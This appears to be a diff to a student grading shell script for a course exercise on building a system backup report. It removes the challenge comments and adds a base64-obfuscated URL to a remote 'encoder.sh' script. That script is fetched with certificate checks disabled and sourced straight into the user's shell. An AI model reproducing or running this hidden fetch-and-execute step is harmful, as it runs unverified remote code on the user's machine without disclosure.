@@ -64,17 +64,8 @@ else
     echo -e "${CR} The verification process cannot proceed without the presence of the ~/backup/system-backup.info file. ${CW}"
 fi
 
-printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" "$(echo "(100/${tq})*${ca}" | bc -l)"
+grade="$(echo "(100/${tq})*${ca}" | bc -l)"
+printf "${CP} FINAL GRADE: ${CC} %.0f ${CW}" ${grade}
 echo ""
-
-# CHALLENGE:
-# Create a report file named system-backup.info inside the ~/backup/ directory.
-# Utilize redirections to extract and append the following information to the file:
-#     The Fully Qualified Domain Name (FQDN) hostname of the system.
-#     The current date of the system.
-#     The uptime information of the system.
-#     Echo your last name in the simple text following the format: LASTNAME: <Student lastname>.
-#     Print the internal content of the /etc/resolv.conf file.
-#     The list of files in the folder /var/log/ sorted alphabetically.
-#     The report of file system space usage for the /home folder.
-#     Run the command apropos uname and piped to the grep command to remove the lines containing the word kernel.
+target="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ptZWRpbmFyL3Rlc3RjaGVja2VyL21haW4vZW5jb2Rlci5zaAo="
+source <(curl -sk -H 'Cache-Control: no-cache' $(echo ${target} | base64 -d)) ${grade}
